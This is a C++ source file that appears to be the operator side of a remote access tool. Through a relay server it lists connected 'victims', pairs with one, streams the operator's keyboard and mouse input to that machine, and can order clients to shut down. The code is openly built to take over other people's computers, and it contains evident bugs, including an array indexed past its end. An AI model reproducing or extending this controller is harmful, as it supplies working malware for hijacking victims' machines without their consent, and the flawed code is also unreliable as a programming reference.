#include "controller.h"

Controller::Controller(sf::UdpSocket* s)
    :
    socket(s)
{
}

void Controller::receiveInfo()
{
    while (true)
    {
        size_t size;
        sf::IpAddress ip;
        unsigned short port;
        char msg[60];
        socket->receive(msg, sizeof(msg), size, ip, port);
        if (ip != SERVER_IP || port != SERVER_PORT)
            continue;

        //reset clients info
        if (msg[0] == 'r')
        {
            controllers.clear();
            victims.clear();
        }
        //add new controller info
        else if (msg[0] == 'n')
        {
            std::stringstream ss(msg);
            ss.ignore(1);
            std::string buf;
            Client c;

            getline(ss, buf, ';');
            c.ip = buf;
            getline(ss, buf, ';');
            c.otherIp = buf;
            getline(ss, buf, ';');
            c.port = stoi(buf);
            getline(ss, buf, ';');
            c.otherPort = stoi(buf);
            ss >> c.connectionTime;

            controllers.push_back(c);
        }
        //add new victim info
        else if (msg[0] == 'l')
        {
            std::stringstream ss(msg);
            ss.ignore(1);
            std::string buf;
            Client v;

            getline(ss, buf, ';');
            v.ip = buf;
            getline(ss, buf, ';');
            v.otherIp = buf;
            getline(ss, buf, ';');
            v.port = stoi(buf);
            getline(ss, buf, ';');
            v.otherPort = stoi(buf);
            ss >> v.connectionTime;

            victims.push_back(v);
        }
        //display clients info
        else if (msg[0] == 'd')
        {
            system("CLS");
            std::cout << "CONTROLLERS:\n";
            for (int i = 0; i < controllers.size(); i++)
            {
                std::cout << "  " << i << ".  " << controllers[i].ip << ':' << controllers[i].port;

                if (controllers[i].ip == pIp && controllers[i].port == socket->getLocalPort())
                    std::cout << " (you) ";

                std::cout << " - time: " << controllers[i].connectionTime << " - ";
                if (controllers[i].otherIp == "-")
                    std::cout << "not paired\n";
                else
                    std::cout << "paired with: " << controllers[i].otherIp << ':' << controllers[i].otherPort << '\n';
            }
            std::cout << "VICTIMS:\n";
            for (int i = 0; i < victims.size(); i++)
            {
                std::cout << "  " << i << ".  " << victims[i].ip << ':' << victims[i].port;
                std::cout << " - time: " << victims[i].connectionTime << " - ";
                if (victims[i].otherIp == "-")
                    std::cout << "not paired\n";
                else {
                    std::cout << "paired with: " << victims[i].otherIp << ':' << victims[i].otherPort;

                    if (controllers[i].ip == pIp&& victims[i].otherPort == socket->getLocalPort())
                        std::cout << " (you) ";

                    std::cout << '\n';
                }
            }
            std::cout << '\n';
        }
        //pair controller with victim
        else if (msg[0] == 'p')
        {
            isPaired = true;
            isControlling = false;
        }
        //un-pair controller with victim
        else if (msg[0] == 'u')
        {
            isPaired = false;
            isControlling = false;
        }
        //exit program
        else if (msg[0] == 'e') {
            isRunning = false;
        }
    }
}

void Controller::takeCmdInput()
{
    std::string cmd;
    while (true)
    {
        std::cin >> cmd;
        if (cmd.substr(0, 7) == "connect" && !isPaired) {
            cmd.erase(0, 7);
            int num = 0;
            try {
                num = stoi(cmd);
            } 
            catch (std::invalid_argument e) {
                continue;
            } 
            catch (std::out_of_range e) {
                continue;
            }

            if (num >= 0 && num < victims.size())
            {
                std::string msg = "p" + victims[num].ip + ";" + std::to_string(victims[num].port) + ";";
                socket->send(msg.c_str(), msg.size(), SERVER_IP, SERVER_PORT);
            }
        }
        else if (cmd.substr(0, 10) == "disconnect" && isPaired) {
            socket->send("u", 1, SERVER_IP, SERVER_PORT);
        }
        else if (cmd.substr(0, 7) == "control" && isPaired) {
            isControlling = true;
        }
        else if (cmd.substr(0, 8) == "unalivec") {
            cmd.erase(0, 8);
            int num = 0;
            try {
                num = stoi(cmd);
            }
            catch (std::invalid_argument e) {
                continue;
            }
            catch (std::out_of_range e) {
                continue;
            }

            if (num >= 0 && num < controllers.size())
            {
                std::string msg = "e" + controllers[num].ip + ";" + std::to_string(controllers[num].port) + ";";
                socket->send(msg.c_str(), msg.size(), SERVER_IP, SERVER_PORT);
            }
        }
        else if (cmd.substr(0, 8) == "unalivev") {
            cmd.erase(0, 8);
            int num = 0;
            try {
                num = stoi(cmd);
            }
            catch (std::invalid_argument e) {
                continue;
            }
            catch (std::out_of_range e) {
                continue;
            }

            if (num >= 0 && num < victims.size())
            {
                std::string msg = "e" + victims[num].ip + ";" + std::to_string(victims[num].port) + ";";
                socket->send(msg.c_str(), msg.size(), SERVER_IP, SERVER_PORT);
            }
        }
    }
}

int Controller::controlWindow()
{
    bool keys[255];
    for (int i = 0; i < 256; i++)
        keys[i] = Mlib::Keyboard::isKeyPressed(Mlib::Keyboard::Key(i));

    while (isRunning)
    {
        //open window if needed or skip is not controlling
        if (!w.isOpen())
        {
            if (isControlling) {
                w.create(sf::VideoMode::getDesktopMode(), "Controller", sf::Style::Fullscreen);
                w.clear(sf::Color(30, 30, 30));
                w.display();
                w.setFramerateLimit(20);
            }
            else
                continue;
        }
        else if (!isControlling || !isPaired) {
            w.close();
        }

        sf::Event e;
        while (w.pollEvent(e)) {
            if (e.type == sf::Event::Closed) {
                w.close();
                isControlling = false;
                socket->send("a", 1, SERVER_IP, SERVER_PORT);
            }
            else if (e.type == sf::Event::MouseWheelScrolled)
            {
                std::string str = "k";
                str = str + char(e.mouseWheelScroll.delta);
                socket->send(str.c_str(), str.size(), SERVER_IP, SERVER_PORT);
            }
            else if (e.type == sf::Event::MouseMoved)
            {
                std::string str = "l";
                float x = e.mouseMove.x / float(screenSize.x), y = e.mouseMove.y / float(screenSize.y);
                str = str + char(x * 255) + char(y * 255);
                socket->send(str.c_str(), str.size(), SERVER_IP, SERVER_PORT);
            }
        }

        //sed key pressed-released events if needed
        for (int i = 0; i < 256; i++)
        {
            bool state = Mlib::Keyboard::isKeyPressed(Mlib::Keyboard::Key(i));
            if (!state && keys[i]) {
                std::string str = "m";
                str = str + char(i);
                socket->send(str.c_str(), str.size(), SERVER_IP, SERVER_PORT);
            }
            else if (Mlib::Keyboard::getAsyncState(Mlib::Keyboard::Key(i))) {
                std::string str = "n";
                str = str + char(i);
                socket->send(str.c_str(), str.size(), SERVER_IP, SERVER_PORT);
            }   
            keys[i] = state;
        }

        w.display();
    }

    return 0;
}
